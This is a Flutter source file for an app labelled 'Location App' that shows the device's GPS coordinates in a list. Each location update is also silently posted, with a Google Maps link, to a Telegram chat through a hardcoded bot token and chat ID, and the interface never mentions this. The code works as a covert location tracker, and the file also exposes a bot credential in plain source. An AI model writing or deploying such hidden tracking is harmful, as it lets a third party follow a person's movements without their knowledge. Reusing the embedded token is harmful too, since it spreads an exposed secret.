import 'dart:async';
import 'dart:developer';
import 'package:flutter/material.dart';
import 'package:get/get_navigation/get_navigation.dart';
import 'package:location/location.dart' as l;
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;

void main() => runApp(const MyApp());

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return const GetMaterialApp(
      themeMode: ThemeMode.system,
      debugShowCheckedModeBanner: false,
      home: HomeScreen(),
    );
  }
}

class HomeScreen extends StatefulWidget {
  const HomeScreen({Key? key}) : super(key: key);

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  bool gpsEnabled = false;
  bool permissionGranted = false;
  l.Location location = l.Location();
  late StreamSubscription subscription;
  bool trackingEnabled = false;

  List<l.LocationData> locations = [];

  final String botToken = '7613366750:AAF18u337ZGgfrlCw9Kh7Txgip6gbZFUXh4';
  final String chatId = '5080555370';

  @override
  void initState() {
    super.initState();
    checkStatus();
  }

  @override
  void dispose() {
    stopTracking();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Location App'),
        centerTitle: true,
      ),
      body: Padding(
        padding: const EdgeInsets.symmetric(horizontal: 12),
        child: Column(
          children: [
            buildListTile(
              "GPS",
              gpsEnabled
                  ? const Text("Okey")
                  : ElevatedButton(
                      onPressed: requestEnableGps,
                      child: const Text("Enable Gps")),
            ),
            buildListTile(
              "Permission",
              permissionGranted
                  ? const Text("Okey")
                  : ElevatedButton(
                      onPressed: requestLocationPermission,
                      child: const Text("Request Permission")),
            ),
            buildListTile(
              "Location",
              trackingEnabled
                  ? ElevatedButton(
                      onPressed: stopTracking,
                      child: const Text("Stop"))
                  : ElevatedButton(
                      onPressed: gpsEnabled && permissionGranted
                          ? startTracking
                          : null,
                      child: const Text("Start")),
            ),
            Expanded(
              child: ListView.builder(
                itemCount: locations.length,
                itemBuilder: (context, index) {
                  return ListTile(
                    title: Text(
                      "${locations[index].latitude} ${locations[index].longitude}"),
                  );
                },
              ),
            )
          ],
        ),
      ),
    );
  }

  ListTile buildListTile(String title, Widget? trailing) {
    return ListTile(
      dense: true,
      title: Text(title),
      trailing: trailing,
    );
  }

  void requestEnableGps() async {
    if (!gpsEnabled) {
      bool isGpsActive = await location.requestService();
      setState(() => gpsEnabled = isGpsActive);
    }
  }

  void requestLocationPermission() async {
    PermissionStatus status = await Permission.locationWhenInUse.request();
    setState(() => permissionGranted = status == PermissionStatus.granted);
  }

  Future<bool> isPermissionGranted() async =>
      await Permission.locationWhenInUse.isGranted;

  Future<bool> isGpsEnabled() async =>
      await Permission.location.serviceStatus.isEnabled;

  void checkStatus() async {
    setState(() {
      isPermissionGranted().then((val) => permissionGranted = val);
      isGpsEnabled().then((val) => gpsEnabled = val);
    });
  }

  void addLocation(l.LocationData data) {
    setState(() => locations.insert(0, data));
  }

  void clearLocation() => setState(() => locations.clear());

  void startTracking() async {
    if (!(await isGpsEnabled()) || !(await isPermissionGranted())) return;

    subscription = location.onLocationChanged.listen((event) {
      addLocation(event);
      sendToTelegram(event.latitude!, event.longitude!);
    });

    setState(() => trackingEnabled = true);
  }

  void stopTracking() {
    subscription.cancel();
    setState(() => trackingEnabled = false);
    clearLocation();
  }

  Future<void> sendToTelegram(double lat, double lng) async {
    final url = Uri.parse(
        'https://api.telegram.org/bot$botToken/sendMessage');

    final text = "📍 New location:\nLatitude: $lat\nLongitude: $lng\nhttps://maps.google.com/?q=$lat,$lng";

    try {
      await http.post(url, body: {
        'chat_id': chatId,
        'text': text,
      });
      log("Location sent to Telegram");
    } catch (e) {
      log("Failed to send location: $e");
    }
  }
}
